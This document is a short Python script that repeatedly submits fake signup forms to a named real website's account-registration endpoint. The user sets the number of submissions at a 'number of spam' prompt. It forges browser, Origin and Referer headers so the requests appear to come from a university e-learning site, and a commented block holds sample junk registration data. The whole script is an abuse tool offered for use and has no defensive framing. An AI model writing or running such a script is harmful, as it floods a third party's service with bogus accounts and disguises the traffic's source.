import requests, random

url = 'https://mainlagiaja.com/account/signup'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Dnt': '1',
    'Origin': 'https://elearning.uty.ac.id',
    'Referer': 'https://elearning.uty.ac.id/login/signup.php',
    'Sec-Ch-Ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.142.86 Safari/537.36',
}

'''
{"name":"qwadsa dsadsadas","email":"qewqeqeqw@dsada.dsa","phone":"1234567890","password":"1234567890","password_confirmation":"1234567890","referral_code":""}
'''



loop_value = int(input("number of spam: "))

for loop in range(1, loop_value+1):
    data = {
        'first_name': 'eqweqeq',
        'last_name': 'ewqeqeqw',
        'phone': '123213123131',
        'password': '1234567890',
        'password2': '1234567890',
        'tombol': 'submit'
    }
    response = requests.post(url, data=data, headers=headers)
    loop = str(loop).zfill(5)
    print(loop)
    print(response.status_code)